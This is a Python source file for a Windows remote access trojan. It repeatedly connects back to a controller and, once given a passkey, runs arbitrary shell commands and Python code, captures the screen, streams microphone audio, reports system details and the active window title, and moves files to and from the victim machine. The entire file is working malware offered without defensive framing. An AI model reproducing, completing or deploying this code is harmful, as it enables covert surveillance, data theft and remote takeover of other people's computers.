# -*- coding: utf-8 -*-
# !/usr/bin/python

import socket
import time
import os
import subprocess
import threading
import ctypes
import sys
import platform
import zlib
import pyaudio


# INIT VARIABLES
HOST = '127.0.0.1'
PORT = 4434
active = False
passKey = r'1705a7f91b40320a19db18912b72148e'  # MD5 key: paroli123
__version__ = '1.0'
__ostype__ = str(sys.platform)
__os__ = str(platform.platform())
__user__ = str(platform.node())
# INIT Widnows DLL's
Kernel32 = ctypes.windll.kernel32
User32 = ctypes.windll.user32
Gdi32 = ctypes.windll.gdi32
# INIT Sockets bank
socketsBank = {}
# INIT Screen*
hDesktopWnd = User32.GetDesktopWindow()
left = User32.GetSystemMetrics(76)
top = User32.GetSystemMetrics(77)
right = User32.GetSystemMetrics(78)
bottom = User32.GetSystemMetrics(79)
width = right - left
height = bottom - top


class BITMAPFILEHEADER(ctypes.Structure):
    _fields_ = [
        ('bfType', ctypes.c_short),
        ('bfSize', ctypes.c_uint32),
        ('bfReserved1', ctypes.c_short),
        ('bfReserved2', ctypes.c_short),
        ('bfOffBits', ctypes.c_uint32)]


class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ('biSize', ctypes.c_uint32),
        ('biWidth', ctypes.c_int),
        ('biHeight', ctypes.c_int),
        ('biPlanes', ctypes.c_short),
        ('biBitCount', ctypes.c_short),
        ('biCompression', ctypes.c_uint32),
        ('biSizeimage', ctypes.c_uint32),
        ('biXPelsPerMeter', ctypes.c_long),
        ('biYPelsPerMeter', ctypes.c_long),
        ('biClrUsed', ctypes.c_uint32),
        ('biClrImportant', ctypes.c_uint32)]


class BITMAPINFO(ctypes.Structure):
    _fields_ = [
        ('bmiHeader', BITMAPINFOHEADER),
        ('bmiColors', ctypes.c_ulong * 3)]


bmp_info = BITMAPINFO()


# Get info about app & pc
def PCINFO():
    return str({
        'ostype': __ostype__,
        'os': __os__,
        'protection': str(active),
        'user': __user__,
        'version': __version__,
        'activewindowtitle': GetWindowTitle(),
    })

def SCREENSHOT():
    return str({
        'screenshot': ScreenBITS(),
        'width': str(bmp_info.bmiHeader.biWidth),
        'height': str(bmp_info.bmiHeader.biHeight),
    })


def Send(sock, data, mode, splitter='%:::%', end="[ENDOFMESSAGE]"):
    msg = (data + end).encode('utf-8')
    size = sys.getsizeof(msg)
    msg = mode + splitter + msg
    sock.sendall(str(size) + '%:::%' + msg)


def Receive(sock, splitter='%:::%', end="[ENDOFMESSAGE]"):
    recievedData = ""
    l = sock.recv(1024)
    while l:
        recievedData = recievedData + l
        if recievedData.endswith(end):
            break
        else:
            l = sock.recv(1024)
    if recievedData.count(splitter):
        _type, message = recievedData.split(splitter)
        return _type, message[:-len(end)].decode('utf-8')
    else:
        return 'info', ''

def upload(sock, filename, end="[ENDOFMESSAGE]"):
    if not os.path.exists(filename):
        return 'fileExistsError'

    sock.sendall(str(os.path.getsize(filename)))
    if sock.recv(2) == 'ok':
        with open(filename, 'rb') as _file:
            while 1:
                l = _file.readline()
                if l:
                    sock.sendall(l)
                else:
                    sock.sendall(end)
                    break
            return 'uploadDone'
    return 'uploadError'

def download(sock, filename, end="[ENDOFMESSAGE]"):
    recievedData = ''
    try:
        l = sock.recv(1024)
        while l:
            recievedData += l
            if recievedData.endswith(end):
                break
            else:
                l = sock.recv(1024)
        with open(filename, 'wb') as _file:
            _file.write(recievedData[:-len(end)])
        return 'downloadDone'
    except:
        return 'downloadError'


def ScreenBITS():
    hDesktopDC = User32.GetWindowDC(hDesktopWnd)
    hCaptureDC = Gdi32.CreateCompatibleDC(hDesktopDC)
    hCaptureBitmap = Gdi32.CreateCompatibleBitmap(hDesktopDC, width, height)
    Gdi32.SelectObject(hCaptureDC, hCaptureBitmap)
    Gdi32.BitBlt(hCaptureDC, 0, 0, width, height, hDesktopDC, left, top, 0x00CC0020)
    hdc = User32.GetDC(None)
    bmp_info.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    DIB_RGB_COLORS = 0
    Gdi32.GetDIBits(hdc, hCaptureBitmap, 0, 0, None, ctypes.byref(bmp_info), DIB_RGB_COLORS)
    bmp_info.bmiHeader.biSizeimage = int(
        bmp_info.bmiHeader.biWidth * abs(bmp_info.bmiHeader.biHeight) * (bmp_info.bmiHeader.biBitCount + 7) / 8)
    pBuf = ctypes.create_unicode_buffer(bmp_info.bmiHeader.biSizeimage)
    Gdi32.GetBitmapBits(hCaptureBitmap, bmp_info.bmiHeader.biSizeimage, pBuf)
    return zlib.compress(pBuf)


def Execute(source):
    global data
    data = ''
    try:
        exec source
        if data == '':
            return 'No output<br>example: data = "SOME TEXT OR VARIABLE"'
        return str(data)
    except Exception as e:
        return str(e)


def Exec(cmde):
    if cmde:
        try:
            execproc = subprocess.Popen(cmde, shell=True,
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            cmdoutput = execproc.stdout.read() + execproc.stderr.read()
            return cmdoutput
        except Exception as e:
            return str(e)

    else:
        return "Enter a command.\n"


def has_hidden_attribute(filepath):
    try:
        attrs = Kernel32.GetFileAttributesW(unicode(filepath))
        assert attrs != -1
        result = bool(attrs & 2)
    except (AttributeError, AssertionError):
        result = False
    return result


def set_content_attribute(filepath):
    if has_hidden_attribute:
        Kernel32.SetFileAttributesW(filepath, 1)
    else:
        Kernel32.SetFileAttributesW(filepath, 2)


def GetWindowTitle():
    GetForegroundWindow = User32.GetForegroundWindow
    GetWindowTextLength = User32.GetWindowTextLengthW
    GetWindowText = User32.GetWindowTextW
    HWND = GetForegroundWindow()
    length = GetWindowTextLength(HWND)
    buff = ctypes.create_unicode_buffer(length + 1)
    GetWindowText(HWND, buff, length + 1)
    return buff.value


class childSocket(threading.Thread):
    def __init__(self, id):
        super(childSocket, self).__init__()

        self.active = True
        self.id = id

    def run(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((HOST, PORT))

        while self.active:
            try:
                mode, data = Receive(self.socket)
                if data == 'pcinfo':
                    Send(self.socket, PCINFO(), mode)
                else:
                    Send(self.socket, self.id, mode)
            except socket.error:
                return

class audioStreaming(threading.Thread):

    def __init__(self, sock):
        super(audioStreaming, self).__init__()

        self.active = True
        self.sock = sock

        self.chunk = 1024
        self.format = pyaudio.paInt16
        self.channel = 1
        self.rate = 10240

        self.p = pyaudio.PyAudio()

        self.stream = self.p.open(format=self.format,
                                  channels=self.channel,
                                  rate=self.rate,
                                  input=True,
                                  frames_per_buffer=self.chunk)

    def run(self):
        while self.active:
            try:
                data = self.stream.read(self.chunk)
                Send(self.sock, data, 'audiostreaming')
            except socket.error:
                self.active = False

        self.stream.close()
        self.p.terminate()


def startChildSocket(id):
    socketsBank[id] = childSocket(id)
    socketsBank[id].setDaemon(True)
    socketsBank[id].start()


def fromAutostart():
    global active
    global passKey
    while 1:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
        except:
            s.close()
            active = False
            time.sleep(5)
            continue

        while 1:
            try:
                mode, data = Receive(s)
                if data == 'info':
                    Send(s, PCINFO(), mode)
                    continue
                if data == 'getScreen':
                    Send(s, SCREENSHOT(), mode)
                    continue
                if data.startswith('startChildSocket'):
                    Send(s, startChildSocket(str(data.split(' ')[-1])), mode)
                    continue
                if data == passKey:
                    active = True
                    Send(s, 'iamactive', mode)
                    while active:
                        mode, data = Receive(s)
                        if data == "lock":
                            active = False
                            break
                        if data == 'info':
                            stdoutput = PCINFO()
                        elif data == 'getScreen':
                            stdoutput = SCREENSHOT()
                        elif data.startswith('upload '):
                            try:
                                filename = data.split(' ')[1]
                                stdoutput = download(s, filename)
                            except:
                                stdoutput = 'uploadError'
                        elif data.startswith('download '):
                            try:
                                filename = data.split(' ')[1]
                                stdoutput = upload(s, filename)
                            except:
                                stdoutput = 'downloadError'
                        elif data.startswith("cd"):
                            try:
                                os.chdir(data[3:])
                                stdoutput = ""
                            except:
                                stdoutput = "Error opening directory"
                        elif data.startswith(("Activate")):
                            stdoutput = ''
                        elif data.startswith("runscript "):
                            stdoutput = Execute(data[10:])
                        elif data.startswith("ls"):
                            string = {}
                            try:
                                for n, i in enumerate(os.listdir(u'.')):
                                    string[n] = {}
                                    string[n]['name'] = i
                                    string[n]['type'] = os.path.isfile(i)
                                    string[n]['size'] = os.path.getsize(i)
                                    string[n]['modified'] = time.ctime(os.path.getmtime(i))
                                    string[n]['hidden'] = has_hidden_attribute(i)
                                string['path'] = os.getcwdu()
                                stdoutput = str(string)
                            except WindowsError:
                                stdoutput = 'Access is denied'
                        else:
                            stdoutput = Exec(data)
                        Send(s, stdoutput, mode=mode)
                    if data == "terminate":
                        break
                    time.sleep(3)
                else:
                    Send(s, 'parent', mode)
            except socket.error:
                s.close()
                active = False
                time.sleep(10)
                break


fromAutostart()
